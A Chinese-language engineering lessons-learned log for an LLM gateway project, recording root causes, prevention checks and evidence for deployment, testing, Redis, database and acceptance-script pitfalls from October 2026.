- 证据：旧 JOIN 52.8s/0 行；summaries 近窗 0.76ms/180 行
- 状态：观察中

## 2026-10-14 — miniredis「跨实例」测用了不同 Redis key 前缀 → 假红（Seen: 1/3）
- 任务 / 缺陷：`p0b_rawlogs_miniredis_convergence_test` 首跑 LearnedParams=[]
- 基线 / 修复 SHA：未提交（基线 `ed620001e`）
- 场景与影响：Diagnose/RecordTerminal 正确，实例 B 永远读空；单独 debug 子测却绿
- 根因：`newTestRedisStore` 前缀 `llmgw:reqanom:test`，实例 B 误用 `…:rawlogs`——同 miniredis 不同 key 空间
- 防复发检查：跨实例夹具断言两侧 Store 前缀字符串相等；先 `storeA.List` 再读 B
- 证据：改同前缀后 rawlogs 两子测 + Diagnose error.loc 绿；M6 去 error.loc 臂双红
- 状态：观察中

## 2026-10-14 — macOS `strings|grep -q` 在 pipefail 下把命中判成指纹假 MISS（Seen: 1/3）
- 任务 / 缺陷：magpie P0 部署观测脚本 `scripts/observe-magpie-p0-postdeploy.sh`
- 基线 / 修复 SHA：未提交（基线 `ed620001e`）；工作区已改脚本为 python 字节搜索
- 场景与影响：Go 二进制里确实有 `probeOne single-flight` / `llmgw:probe_one:`，但脚本全报 MISS；裸 `strings|grep -F` 却 OK
- 根因：`set -o pipefail` + `grep -q` 提前关管 → `strings` 收 SIGPIPE 非 0 → `if` 整段失败；另：const 标识符名不进 rodata，须钉字面量并经 `init` 保活防 DCE
- 防复发检查：指纹扫描用 `python3` 字节 `in`；契约类指纹用 `init` 赋值到 package var；审计文档写明禁止 `strings|grep -q`
- 证据：`TARGET=local BIN=/tmp/magpie-p0-bin/gateway bash scripts/observe-magpie-p0-postdeploy.sh` → 三指纹 OK（OBS=0）；修前 OBS=1 全 MISS
- 状态：观察中

## 2026-10-14 — `/usr/bin/env bash` 在 macOS 落 bash 3.2，`declare -A` 直接炸（Seen: 1/3）
- 任务 / 缺陷：`observe-magpie-p0-postdeploy.sh` 基线对照段首加 `declare -A COUNTS`
- 基线 / 修复 SHA：未提交；已改为普通 `for` + python 打基线 diff（无 assoc array）
- 场景与影响：本机 `bash scripts/observe-…` 在指纹 OK 后 `declare: -A: invalid option`，基线 diff 整段跳过
- 根因：shebang/`env bash` ≠ `~/sdk/bash5`；deploy-lib 族已要求 bash5，观测脚本却假定 4+
- 防复发检查：观测/部署辅助脚本禁止 `declare -A` / `${var^^}`，或显式用 `$HOME/sdk/bash5/bin/bash`；改完用裸 `/usr/bin/env bash` 复跑
- 证据：修前 OBS 中段炸；修后对照 `magpie-p0-154-baseline-20261014.json` 三指纹 `CHANGED`/`OK expected`
- 状态：观察中

## 2026-10-14 — 154 观测脚本默认 `gateway` + 裸 journal unit + grep 零命中 → 假 FAIL/中途死（Seen: 1/3）
- 任务 / 缺陷：`observe-magpie-p0-postdeploy.sh` 对 154 现网只读烟测
- 基线 / 修复 SHA：未提交；已改双候选 `llm-gateway-go|gateway`、canary@port 日志/unit、`grep|wc || echo 0`
- 场景与影响：BIN 默认 `/opt/.../gateway` → FileNotFound；`journalctl -u llm-gateway-go` 几乎空；`set -o pipefail` 下首个 0 计数 `grep` exit 1 打死脚本（指纹 MISS 后看不到 count/baseline）
- 根因：多 checkout 文档混用二进制名；蓝绿 canary unit 未进脚本；零命中被当成管道失败
- 防复发检查：观测脚本必须解析两名；优先 `gateway-canary-$port.log`；凡 `grep|wc` 计数加 `|| echo 0`；改后对 154 现网（故意 MISS 指纹）跑通到 baseline compare
- 证据：修后 `OBS_154` BIN 解析成功、readyz ok、count[*]=0、baseline same/MISS 打印完整
- 状态：观察中

## 2026-10-16 — 已登记迁移不等于物理契约成立（Seen: 1/3）
- 任务 / 缺陷：[Magpie第三轮](docs/audit/2026-10-15-magpie第三轮字节与会话一致性.md)；708有marker/hash，但body parent/hot/unified均缺kind，12条补偿报42703。
- 基线 / 修复 SHA：基线 `493d24ebcdaf45d792130f32b42e6724cb667905`；修复 `8b04755c13e67546670b9dae27db64d067591e63`。
- 根因：只检查ledger无法证明真实列、默认值、索引、视图和权限；历史成因不能从单一marker倒推。
- 防复发检查：新编号增量修复，保留旧迁移原字节；升级通道即使marker齐全也跑可复用postcondition；真实PG保留原行、NULL拒绝整笔回滚、writer完整hook均需在场。
- 证据：独立PG17 ingest四族与settings三组通过；删除物理断言的隔离变异准确红；独立DB review通过017653d81。实际业务部署另见审计，不把夹具结果冒称现网结果。
- 状态：已修复待观察

## 2026-10-16 — 成功黄金矩阵必须配失败终态和思考语义（Seen: 1/3）
- 任务 / 缺陷：[Magpie第三轮](docs/audit/2026-10-15-magpie第三轮字节与会话一致性.md)；24成功交换全绿仍漏response.failed被当stop及thinking经Chat中转丢失。
- 基线 / 修复 SHA：发现于 `3643d9db9ac876c7d8d15365e4b1da0b6d024fc0`；修复终点 `7c7102af0378fe246c967bf62f684ecc8c4d2360`。
- 根因：只约束最终请求体和成功回复，无法覆盖错误外显；中间协议的序列化不是无损容器。
- 防复发检查：真实handler→Executor桥加入失败、unknown incomplete、EOF/read error、取消及thinking enabled/adaptive；完整独立语义断言先于黄金录制。
- 证据：真实failed流原黄金用例PASS、新判据红；修后14负向/截断路径和8思考黄金通过，7对应变异准确红；原26黄金字节保持。
- 状态：已修复待观察

## 2026-10-16 — Redis原子执行不提供错误回滚，清理失败也不撤销已确认提交（Seen: 1/3）
- 任务 / 缺陷：[Magpie第三轮](docs/audit/2026-10-15-magpie第三轮字节与会话一致性.md)；ACL拒绝PEXPIRE后原pair已改变；release-only失败使strip/tasks从4/7重复累计为5/9。
- 基线 / 修复 SHA：本轮缓存实现，基线 `d357bf985ec58f728632a9fb6a0146c4be8a8543`；最终提交见审计精确SHA。
- 根因：Lua不会回滚先前DEL/HSET；把cleanup错误覆盖primary ack会让调用方保留已生效的待累计增量。
- 防复发检查：同脚本第一次持久修改前按实际参数检查所有写权限；真实Redis逐项拒绝DEL/HSET/PEXPIRE并校验完整旧hash及绝对TTL；独立有界token cleanup只记录故障，primary结果保持。
- 证据：真实ACL负控原实现准确红；修后真实strict race通过；release-only仓内红→绿，updateCache→CommitFinal保持4/7；撤ack保护/吞主错误/去token保护均命中正确断言。
- 状态：已修复待观察

## 2026-10-16 — 跨入口会话验收须分开响应契约与异步落库（Seen: 1/3）
- 任务 / 缺陷：[Magpie第三轮验收](docs/audit/2026-10-15-magpie第三轮字节与会话一致性.md)；脚本把裸UUID发canonical头、要求Chat回同名头，随后又用5秒同步可见性判异步镜像，连续两轮假红。
- 基线 / 修复 SHA：发布源码`76e185e71cebe87611746d03cea56bbc352a4d7b`未变；修正验收脚本，不据此修改生产。
- 根因：同为会话ID不代表三入口的header值域/响应行为相同；HTTP完成不代表后台镜像/补偿已同步完成。
- 防复发检查：先读真实入口契约；用实际返回request_id且要求互异，按tenant查canonical，分别比较显式ID和存在的响应头；独立核turn/body/date/终态/双delta，有界等待并记录elapsed，不重发请求或放宽告示阈值。
- 证据：最终18HTTP与17唯一pair通过；8类验收负控正确拒绝；首条旧5秒窗口后的可见性不足以证明冷启动或补偿，原RC1保留。
- 状态：已修复待观察

## 2026-10-16 — `docker exec` 丢 `-i` 后 stdin SQL 静默空跑（Seen: 1/3）
- 任务 / 缺陷：stream_mode 轮（docs/audit/2026-10-16-credential-model-stream-mode.md）；211 库目录查询连续四轮返回空，险些误判「库无 glm 模型、域名后端另有其人」。
- 基线 / 修复 SHA：未提交（基线 `59477eb4c`）。
- 场景与影响：`docker exec [-e …] psql` 不带 `-i` 时 stdin 不进容器，psql 读 EOF 后 rc=0、零输出——与「查询无结果」完全同形；`-c` 形态正常，更迷惑。
- 根因：docker exec 默认不接管 stdin；psql 无 `-c` 时从 stdin 读脚本，空 stdin 即空执行。
- 防复发检查：经 stdin 传 SQL 的 `docker exec` 一律带 `-i`；远端取证脚本先跑 stdin 形态 `SELECT 1` 自证通道再跑业务查询；rc=0 且空输出不得当「无数据」结论。
- 证据：同机 `-c "SELECT 1;"` 出 `1`，stdin 形态 `SELECT 2;` 空（rc 均 0）；补 `-i` 后同一 SQL 立即返回 10 行模型目录。
- 状态：观察中

## 2026-10-16 — 工具候选的授权与缓冲上限要贯穿完整流式链（Seen: 1/3）
- 任务 / 缺陷：[Magpie第四轮](docs/audit/2026-10-16-magpie-round4-tool-contracts-errors.md)；bool-only纠正会凭空造工具名，失败候选又可能被后置MiniMax清理吞掉，choice上限也挡不住无换行物理行。
- 基线 / 修复 SHA：基线 `755c4aecf277e1045fbdf79bdcb3e87deda2dffe`；修复 `ffd9cc6a7`，冻结38文件清单摘要 `d7cd107bdc2b8a4e8a101e887504a55ad7934336d5e61f86fa425c7265303cba`。
- 根因：解析成功不等于客户端授权；局部parser修好后，后置清理、buffer和terminal仍可破坏语义。
- 防复发检查：由真实request取得不可变精确function名称；未知/不完整候选穿过实际hook仍为原文；同时限制choice、候选文本和物理行，验证EOF/data+error/LF/UTF8，不能凭空创建finish。
- 证据：真实三入口与供应商known/inferred路径均有判据；reader五个隔离变异命中预期断言；规格、代码、Go审查覆盖最终38文件。
- 状态：已修复待观察

## 2026-10-16 — 工具历史去重需证明镜像且保留原位置和元数据（Seen: 1/3）
- 任务 / 缺陷：[Magpie第四轮](docs/audit/2026-10-16-magpie-round4-tool-contracts-errors.md)；ID-only去重会吞不同名称/参数的调用，重建镜像会丢cache_control或改变content顺序。
- 基线 / 修复 SHA：基线 `755c4aecf277e1045fbdf79bdcb3e87deda2dffe`；修复未提交，冻结清单同上。
- 根因：消除重复与保持信息等价是两条独立约束；顶层无重复键也不能证明被编辑的nested content无歧义。
- 防复发检查：局部batch配对；镜像需ID+name+args及一对一次数相等；保留原content块位置和metadata，只抑制对应canonical副本；每个实际field editor拒绝重复目标字段。
- 证据：三客户端×三上游×流/非流18路和6路实际重试通过，34原黄金未改；metadata/order/name/args反例及typed歧义拒绝有独立测试。
- 状态：已修复待观察

<!-- 只有出现具体问题时才新增条目。 -->

```markdown

## <日期> — <一句话模式>（Seen: 1/3 个不同工作日）
- 任务 / 缺陷：<链接或编号>
- 基线 / 修复 SHA：<精确 SHA；未提交时注明“未提交”并记录基线 SHA>
- 场景与影响：<可观察事实>
- 根因：<缺失了哪条约束或验证>
- 防复发检查：<规则 / 回归用例 / 命令>
- 证据：`<命令>` → <实际结果；未运行项和原因>
- 状态：观察中 | 已修复待观察 | 已晋级 → <目标链接>
```

## 2026-10-15 — 版本化配置必须接管全部执行链（Seen: 1/3 个不同工作日）
- 任务 / 缺陷：`codex/sensitive-rule-management`；管理页面停用规则不能仍由旧PII/凭据字段/环境动作执行。
- 基线 / 修复 SHA：基线 `493d24ebcdaf45d792130f32b42e6724cb667905`；本任务代码提交前记录。
- 根因：配置CRUD、语义匹配、协议入口与最终写回的所有权不一致；Chat、Messages、Responses并不共享ServeHTTP入口。
- 防复发检查：规则启停、log/mask/block、重叠豁免、可信还原、三协议输入开/关均在真实执行入口断言；write-time阻断须核HTTP和失败审计，不能只测字节。
- 证据：`TestManagedRuleDisablingStopsCredentialFieldChain`、`TestManagedOverlappingRulesKeepStrictBlock`、`TestManagedOutputTrustAndExplicitScopeActions`、`TestAllProtocolRequestsPinBeforeInputAndWithoutInput`通过；撤还原/去重/双协议Pin/Type限制五项overlay变异均在断言红。
- 状态：已修复待观察

## 2026-10-15 — Redis连接成功不等于订阅成功（Seen: 1/3 个不同工作日）
- 任务 / 缺陷：同任务；SUBSCRIBE ACK黑洞曾阻断数据库补偿轮询和退出。
- 基线 / 修复 SHA：同上；本任务代码提交前记录。
- 根因：启动同步等待pubsub ACK，Receive默认无真实读取期限；立即报错及正常miniredis测试都看不见该失败。
- 防复发检查：订阅建立与DB轮询解耦；真实socket握手期限；专测接受TCP、吞掉ACK、取消退出。
- 证据：独立代理探针修前DB v2/实例v1且退出阻塞；修后v2收敛并正常退出；`TestRedisWithheldSubscribeACKHasDeadline -race -count=3`通过。
- 状态：已修复待观察

## 2026-10-15 — 翻译文件齐全不证明运行时已注册（Seen: 1/3 个不同工作日）
- 任务 / 缺陷：同任务；8语言111键源文件齐全，6个index只import未export。
- 基线 / 修复 SHA：同上；本任务代码提交前记录。
- 根因：测试只检查独立字典文件，没有从真实locale入口装配解析器。
- 防复发检查：加载真实index导出，对每个语言namespace逐键执行i18n解析；同时跑前端全套断点门。
- 证据：真实bundle测试先在6语言undefined断言红；修复后实际locale及i18n逐键解析通过，前端2474测试、类型及构建通过。
- 状态：已修复待观察

## 2026-10-16 — 字符串内容像JSON不代表它是参数容器（Seen: 1/3 个不同工作日）

- 根因：工具根arguments/input和真实嵌套字符串共用JSON解码入口；解码清空字段标签，导致人工配置auth_blob等规则及内置password规则被绕过。
- 防复发：仅协议根容器允许解码；实际字符串叶子先沿配置字段规则处理并保留完整还原边界。覆盖内置与自定义字段、JSON样对象/数组串、普通根容器子键的正负判据。
- 证据：48个真实上游载体+Redis完整映射通过；独立公开API探针在password/auth_blob的普通和JSON样串均仅看到占位符；撤guard变异变红。
- 溯源：本任务基线493d24ebcdaf45d792130f32b42e6724cb667905；docs/audit/2026-10-16-sensitive-rule-management-validation.md。

## 2026-10-16 — 路由插入还会改变移动端的源码引用（Seen: 1/3 个不同工作日）

- 任务 / 基线：敏感规则管理；493d24ebcdaf45d792130f32b42e6724cb667905。
- 根因：新增管理路由后只关注后端行为与桌面UI，移动端的Go行号注释及精确断言同样依赖被插入的源文件。
- 防复发：修改路由注册块后运行移动端全树Go引用扫描及真实源码断言；按实际注册处订正注释和断言，不扩大漂移/误报名单。
- 证据：桌面236文件2476测试绿后，移动端原门仍有6文件10条行号失败；完整修复及验证见本任务交付报告。
- 状态：已修复待观察。

## 2026-10-16 — 熔断观测镜像不能抢占恢复准入（Seen: 1/3 个不同工作日）

- 任务 / 基线：Vapeur grok-4.6 经154失败；会话 `mvs_4bfb2af7bdd34b2487a7d70d8785cbf0`，分支 `fix/vapeur-circuit-mirror-20261016`，基线 `dd0d824866`。
- 根因：SQL视图禁用异步 `circuit_state` 并不足够；Go Candidate.UnavailableReason 又用镜像摘流，重启/丢失closed事件时请求无法抵达内存熔断器的半开恢复门。
- 防复发：镜像保留诊断但不做候选准入；同时验证无pin的stale-open候选能到真实forward、live-open/quarantine零上游调用，权威鉴权/额度/人工停用仍拒绝；新门须先红再绿并反向变异。
- 证据：154 `f9fc8b1b97b1ce39d8a1a717a8867f77` 非流式503；`9eb908939f3f0df745042055222d9a29` 流式244秒空正文后失败（不是HTTP200成功）。provider镜像回归修前红；恢复镜像摘流与跳过真实Allow两种变异均命中相应断言；恢复后provider/executors/credential/routeguard全包绿。端到端部署验收另行记录实际结果，不把本地测试当现网成功。
- 上线验收（2026-10-16 15:41–15:47）：以现网基线 `6aaefb57`（154 当时 2674 的构建源）+ 本修复 cherry-pick 出聚焦发布树 `ca502c14`，经 `scripts/deploy-154.sh` 上线 154 = `2669-ca502c14`（`verified:true`，active 8781，`/readyz` ready，旧实例 2674 已 drain）。上线后经 154 网关实测 grok-4.6 仍失败，但失败面已定位清楚：非流式 1.1s 503「No available provider」，日志 `[candidate_diag] db_empty plan_count=0 reason_hint=no_catalog_rows_for_model`；流式 240.7s 后 `gateway_survival_fail_closed / deadline_exceeded`，正文空——HTTP200 不算成功。判别实验：同凭据 grok-4.3 同样 0 候选、健康模型 glm-4.5-flash 200 且正文含 `VAPEUR_OK` → 排除发生在**凭据层**（quota/availability 权威门），不是模型名映射、也不是熔断镜像。直连 Vapeur 双模式均 `429 budget_exceeded / Organization balance insufficient`；凭据 63 为 `quota_state=permanently_exhausted`、`circuit_state=closed`。
- 状态：代码已修并已在 154 上线（`2669-ca502c14`）；**端到端成功验收待 owner 充值 Vapeur 组织余额**，充值后需 force_enable 凭据 63 再跑流式/非流式 E2E。充值前不存在「Grok 恢复成功」这一事实。

## 2026-10-16 — `deploy-154.sh` 的 `exec bash` 会绕过 bash5 入口（Seen: 1/3 个不同工作日）

- 任务 / 基线：154 聚焦部署；工作树 `/Users/huangxt/workspace/llm-gateway-go-grok46`，基线 `6aaefb57` + `ca502c14`。
- 根因：`scripts/deploy-154.sh` 末尾是 `exec bash "$SCRIPT_DIR/deploy-seamless.sh" ...`，这个 `bash` 走 PATH；只用 `~/sdk/bash5/bin/bash scripts/deploy-154.sh` 启动并不能让后续链路跑在 bash5 上，系统 bash 3.2 立刻在 `${target^^}` 报 `bad substitution`、在空数组上抛 `extra_flags[@]: unbound variable`。
- 防复发：调用前把 bash5 目录放到 PATH 最前（`PATH="$HOME/sdk/bash5/bin:$PATH"`），不要只换入口可执行文件；失败后先按 `lock/metadata` 的 `started_at` + 持有 pid 是否存活判陈旧再清锁——该脚本在报错前已把 `deploy.lock` 建在目标机上，留着会让下一次部署直接失败。
- 证据：首跑失败并在 154 留下 `deploy.lock`（持有 pid 75015 已死、`commit=ca502c145`）；判陈旧后清理，PATH 前置重跑通过（总 131s、切换 25s、凭据解密冒烟 `failed=0`）。

## 2026-10-16 — 部署输出过管道会掩盖退出码（Seen: 1/3 个不同工作日）

- 任务 / 基线：同上，154 聚焦部署首跑。
- 根因：`deploy-154.sh ... 2>&1 | tail -80` 的退出码取自 `tail`，脚本中途 `exit 1` 仍呈现 `Command exited with code 0`，差点被当成部署成功。
- 防复发：部署类命令不接管道，重定向到日志文件后单独读文件并显式回显 `RC=$?`；先看回执里的「✓ 部署完成 / verified」再回看退出码。
- 证据：首跑真实失败（bash3.2 报错）；二次运行 `DEPLOY_RC=0`，回执含 `blue-green handoff complete (old=2674-6aaefb57, new=2669-ca502c14, active_port=8781)`、`providers=14,18,13092 creds=17 failed=0`、`verified_at` 已写。

## 2026-10-16 — 「无候选」要先分清凭据层排除还是模型名问题（Seen: 1/3 个不同工作日）

- 任务 / 基线：同上；154 `2669-ca502c14`，库 252 `llm_gateway`。
- 根因：日志里的 `reason_hint=no_catalog_rows_for_model` / `plan_count=0` 读起来像「模型目录里没这个模型」，真实原因却是该凭据被权威 quota/availability 门挡在计划之外——整个 provider 的所有模型一起从候选里消失。
- 防复发：见到 db_empty 就做一次判别实验（同凭据另一模型 vs 另一健康凭据的模型）；只有「同凭据模型全空 + 健康模型正常」才能归因凭据层，再去查 `quota_state`/`availability_state` 与上游真实响应，不要去改模型名映射或目录播种。
- 证据：grok-4.6 与 grok-4.3（凭据 63）均 `plan_count=0`；glm-4.5-flash 200 且正文含 `VAPEUR_OK`；直连上游双模式 429 `budget_exceeded`。

## 2026-10-16 — 线格式学习键必须绑定运行时端点而非声明协议（Seen: 1/3）

- 任务 / 缺陷：[magpie P0 终态审计](docs/audit/2026-10-16-magpie-p0终态审计-13项缺陷五分片收口.md)；reqprobe 学习跨 provider/wire 污染 + Chat 腿误删 stream_options。
- 基线 / 修复 SHA：基线 `dd0d82486`；修复 `86459be8b`。
- 根因：学习键退化为 (providerCode, model) 且用 cand.Protocol（声明协议）——同一 catalog 多 provider 实例互相生效；responses 声明但能力闸门失败实际走 chat 的请求按 responses 记/查，Chat 必需骨架被误删。
- 防复发检查：学习/记忆类键一律 (providerID, outboundModel, actualWire)；actualWire 由运行时端点决策映射（native→responses/anthropic/否则 chat），不得从候选声明反推；空学习快照不缓存（异步学习落地后下一请求立即可见）；量具用目标 wire 的骨架字段（stream_options），不用会被其它裁剪器删掉的字段（reasoning_effort）。
- 证据：declared-wire 变异让 chat 丢 stream_options 红；空缓存变异让异步学习 60s 不可见红；exact-key 隔离测试覆盖同 catalog 双 provider/双 wire。
- 状态：观察中

## 2026-10-16 — 交互 deadline 必须派生 context，durable 未提交即交接（Seen: 1/3）

- 任务 / 缺陷：同审计；survival 240s 只是循环检查点，阻塞 executor 可远超预算；durable 流被 deadline 永久 FailTerminal。
- 基线 / 修复 SHA：基线 `dd0d82486`；修复 `175f987fa`。
- 根因：deadline 存为 time.Time 只在循环边界比较；attempt ctx 未派生 deadline（WithoutCancel 又把父 deadline 一起丢掉）；settlement 只认 client_disconnected 一个交接条件。
- 防复发检查：任何「有界等待」必须 `context.WithTimeoutCause` 派生到执行 ctx（fake Now 与真 wall-clock 解耦）；父 deadline 优先且不渲染 synthetic terminal；durable 在 `deadline_exceeded && !ContentCommitted` 时 ReleaseToWorker，已提交内容绝不重放；恢复提示（Retry-After）沿 AttemptRecord/tracker→CandidateOutcome→Detail 全链传递，判据禁止手构 CandidateOutcome。
- 证据：阻塞 executor 40ms 预算实测 ~40ms 返回；撤 ctx 派生同测超时红；durable resched 断言；1140s hint 端到端出现在 deadline detail。
- 状态：观察中

## 2026-10-16 — 子任务不得清理不属于它的目录；「性能修正」必须与「什么都不做」对照（Seen: 1/3）

- 任务 / 缺陷：request_logs 退役轮（`df9a213de`）。两个独立问题，都发生在同一天。
- 基线 / 修复 SHA：基线 `2f2c163ee`；修复 `df9a213de`。
- 根因一（证据丢失）：子任务为满足「隔离残留为 0」，把整个 `.audit-validation/` 当残留清理——那里是本轮证据目录（416 端点扫描基线、扫描脚本、admin token、deploy 日志）。**清理范围应限于自己创建的临时物，且删除前逐条确认归属。**
- 根因二（优化制造了更大的问题）：`queryTableSizes` 同一天早些时候被加了一层 `FROM ( ... ) sized` 派生表，注释报「1504ms → 527ms」。派生表**挡住了 LIMIT 下推**，toast 相关子查询从 20 次变成 440 次（每次扫 3881 行 ≈ 170 万行）。真实 EXPLAIN：4571ms vs 无派生表 1104ms。那次修正**只测了改后版本、没与「什么都不套」这个更简单的选项对照**，于是把 4571ms 当成了改进。
- 防复发检查：子任务的删除动作限定在自己 `mktemp` 出来的路径，并在报告里单列「我删除了什么」；删除他人目录前必须先 `ls` 并在交接里说明。性能修正必须留**三方对照**（改前 / 改后 / 不改），且对照项是「最简单的替代方案」而不只是「更复杂的等价写法」。派生表 / 子查询包裹这类结构改动，先 `EXPLAIN (ANALYZE)` 看被它挡住的东西（Limit 是否下推、SubPlan 的 loops 变化），再决定留不留。
- 证据：EXPLAIN 对照 —— 带派生表 `SubPlan 1 loops=440 / Execution Time 4571ms`，不带 `loops=20 / 1104–1289ms`；修复后端点 4.3–7.5s → 0.77–1.00s。
- 状态：观察中

## 2026-10-16 — 判据「静默 SKIP」与「未执行分支」是两种不同的假绿（Seen: 1/3）

- 任务 / 缺陷：同退役轮。6 条 storage 判据在**每一个**真实环境里 SKIP；另一条判据的「列存在」分支因前提从未成立而从未跑过。
- 基线 / 修复 SHA：基线 `2f2c163ee`；修复 `df9a213de`。
- 根因一：跳过条件只认 `TEST_DATABASE_URL`，而本仓真库来源恒为 `LLM_GATEWAY_DATABASE_URL`。同族判据 `admin500DSN` 早有三级回退，唯独这个文件没有 ⇒ 优化在 CI 与任何标准环境里**没有守护**，却显示 PASS。
- 根因二：`titleCol=", "` 与 `titleVal=", 'Cold..'"` 各带一个逗号，拼成 `'..', , '..'` ⇒ 42601。该分支因真库一直没有 `sessions.title` 而从未执行；补登迁移让它第一次跑起来才暴露。
- 防复发检查：判据的 DSN / 环境变量取值必须与同族判据**同构**（同一份回退链），不允许各写各的；提交前用「该环境变量在本仓标准入口下确实存在」跑一遍，确认无 SKIP。凡是有「前提在场 / 前提不在场」两条分支的判据，必须分别实跑过——未跑过的分支等于未测试。
- 证据：修 DSN 回退后 6 条判据由全 SKIP 变为 6/6 PASS（cold=2.754s → hot=7.792µs），并完成缓存 TTL 变异（短路 `time.Now().Before(snap.expiresAt)` → `TTLExpiryRefetches` 红在「TTL 形同虚设」）。
- 状态：观察中

## 2026-10-16 — 「既有失败」的归因要用 worktree 强证据，不用 git stash（Seen: 1/3）

- 任务 / 缺陷：同退役轮。子任务报「6 个 admin 测试失败与我无关，追溯到退役轮 staged 改动」。
- 基线 / 修复 SHA：基线 `2f2c163ee`；修复 `df9a213de`。
- 根因：子任务用 `git stash` 做对照——(a) stash 只覆盖它自己的改动，不等于 pristine HEAD；(b) 它自己承认 stash 破坏了 staged/unstaged 区分，把 869 的改动从 staged 变成 unstaged。结论「与本轮无关」因此没有证据支撑。
- 防复发检查：判定「既有失败与我无关」一律用 `git worktree add --detach <tmp> origin/main` 在**同一数据库**下复跑（唯一变量是代码）。禁止用 `git stash` 做对照实验；若确需 stash，事后必须逐文件核对 staged 状态是否复原。
- 证据：`TestCrossTableRequestIDRepresentation` 在 pristine origin/main **PASS**、在本 worktree **FAIL**，同一数据库 ⇒ 确由本轮改动引起，随后白名单项被正确移除。
- 状态：观察中

## 2026-10-16 — 切流失败报「version mismatch」时，先查端口被**哪个部署根**占着（Seen: 1/3）

- 任务 / 缺陷：session-audit 修复上线本地网关。`deploy-local.sh` 连续 3 次 `[cutover] readiness gate failed`，每次都是 `version mismatch {… build_seq: 2677 …} 2.5.8-…-2678`，最后 `error: active cutover failed; previous release was restarted`。
- 基线 / 修复 SHA：基线 `abdd4c752`；修复 `a3acb8bb3`。
- 根因：8782 被**另一个 runtime root**（`~/kaixuan/llm-gateway-go-v2`，非 git 仓库的纯部署根）的进程占着。`deploy-local` 的 pidfile 是 **root 局部**的（`<root>/run/gateway-<port>.pid`），从 worktree 部署时看不见对方的 pidfile ⇒ 停不掉它 ⇒ 新进程 `bind: address already in use` 退出 ⇒ readiness gate 读到的 `/version` 仍是旧进程的 2677 ⇒ 报成「版本不匹配」。
- **回滚不自愈**：脚本的 `previous release was restarted` 只是重启旧 release，它同样 bind 不了那个端口。所以修复永远上不去，而现象看上去像「新构建产物有问题」——本轮差点被引去查二进制。
- 诊断入口：部署 **stdout 不会直说**，只说 version mismatch；真因在 `logs/shutdown.log` 的 `abnormal_exit / exit_type=listen_error / details=listen tcp :8782: bind: address already in use`。
- 防复发检查：部署前先确认 active 端口的占用者属于哪个 root —— `cat <root>/run/active-port` + `cat <root>/run/gateway-<port>.pid` + `ps -p <pid> -o command` 看 binary 路径前缀。若占用者不属本次 root，先用**那个 root 的** run 目录停它；停时按 zombie-aware 判活（本轮 TERM 15s 未退才 KILL，不能只看 pidfile 删除成功就当已停）。另：本机 `lsof -iTCP:<port> -sTCP:LISTEN` 会卡住，用 `lsof -nP -p <pid> | grep LISTEN` 更快。
- 证据：三次 `listen_error`（pid 48486 / 48686）；停掉占用者 8620（v2 root 的 2677）后重部署，`VERIFY_PASS=1`，2679 在 8782 通过 `[verify]` 与凭据解密冒烟。
- 状态：观察中

## 2026-10-16 — 验收脚本的路由与凭据口径必须与被测链同源，且异常路径要清理（Seen: 1/3）

- 任务 / 缺陷：session-audit 端到端验收脚本首跑连挂两次——先 `HTTP 404`，修完变 `HTTP 401`，两次都在共享真库留下 2 行探针数据。
- 基线 / 修复 SHA：基线 `abdd4c752`；修复 `a3acb8bb3`（脚本在 `.audit-validation/`，不入库）。
- 根因一（404）：按 REST 惯例猜成 `/api/auth/login`，实际注册是 `/api/auth/token`（`admin/handler.go:922`）。`grep '"/api/auth/login"'` 零命中本可提前发现。
- 根因二（401）：`.env.local` 的值是**单引号包裹**的，`cut -d= -f2-` 把引号一起带上 ⇒ 拿带引号的串去比对 bcrypt。而部署脚本的 dotenv 解析会去掉定界引号 ⇒ 两边口径不一致。错误文案是「口令与 users 表不匹配」，极易误判成「口令失效、需要找用户重置」，实际只是解析口径问题。
- 防复发检查：(a) 路由名以 `HandleFunc` 注册处为准，不按惯例猜；(b) 复用部署链凭据时，口令走**同一份 dotenv 解析**（配对引号去界），不要自己 cut、也不要落到临时文件再 strip（多一次中间态）；(c) 验收脚本对真库的写入一律放 `finally` 清理——首跑 404 抛异常绕过了清理，探针行留在共享真库污染后续判据计数，只能手工 SQL 清；(d) 端到端断言要**双向**：除了「前提在场时 stats.total≥2」，还要「删掉探针后 total 正好回落 2」的相对对照，否则 `total=0` 既可能是「修好了且真没数据」也可能是「静默失败的老 bug」，响应上无法区分。
- 证据：修正后 12/12 PASS；`finally` 生效的那一轮登录失败也打出「验收数据已清理 — 残留 0 行」；前后对照 `total=2 → 0`，`by_status={need_approval:1, pass:1}`、`avg_score=50`。
- 状态：观察中

## 2026-10-16 — 页面空白先证「数据请求发出去没有」，再谈后端；同一 token 跨端点对照排自己的脚本（Seen: 1/3）

- 任务 / 缺陷：退役轮页面验收。`/request-logs` 渲染完整（顶栏、列头、已登录为超级管理员）但显示「共 0 条」「无记录」，而库里 session_turns 族有 574 行。
- 基线 / 修复 SHA：观察于 `e4cb0c558`（页面侧问题不在本轮退役改动集内，`git diff HEAD~2 HEAD` 对 `web/` 零命中）。
- 根因一（差点误判成产品缺陷）：验收脚本里 `tok = d.get("token") or (d.get("data") or {}).get("token")` **漏了 `access_token` 分支** ⇒ 发出 `Bearer None` ⇒ `/api/logs` 返 401。同一脚本里 `/api/admin/sessions` 却是 200（走的是另一条 token 解析路径），差点得出「admin JWT 读不了 /api/logs」的产品结论。补上分支后同一 token 下 `/api/logs` 返回 **200 + 170KB 数据**。
- 根因二（页面侧，待定）：浏览器 `network` 层显示页面**根本没发出** `/api/logs` 请求，只有 3 个 pending 的辅助请求（`/api/system/background-tasks`、`/api/routing/available-models`、`/api/keys`）；点「刷新」275s 超时。已排除服务端 hang（curl 69ms）、DB、静态资源、网关进程、产物不一致，停在客户端主线程。
- 防复发检查：(a) **页面空白 ≠ 后端无数据**——先用 network 层确认数据请求是否发出，发都没发就别去查后端；(b) 同一响应异常要**跨端点对照**：`/api/admin/sessions` 200 与 `/api/logs` 401 并存时，先怀疑自己的 token 解析，而不是给后端定罪；(c) token 解析写成 `d.get("token") or d.get("access_token") or …` 三段式，别省。
- 证据：补分支后同 token `/api/admin/sessions?limit=2` → 200、`/api/logs` → 200（170246B）、`/api/logs?page=1&page_size=5` → 200（10840B）；页面侧 `inspect` 20ms 正常但 `click`/`query(network)` 275s 超时。
- 状态：观察中（页面侧根因未定位，需能读浏览器 Console 的环境）

## 2026-10-16 — 「写入持续失败」的日志关键字比报错文本更早暴露孤儿迁移（Seen: 1/3）

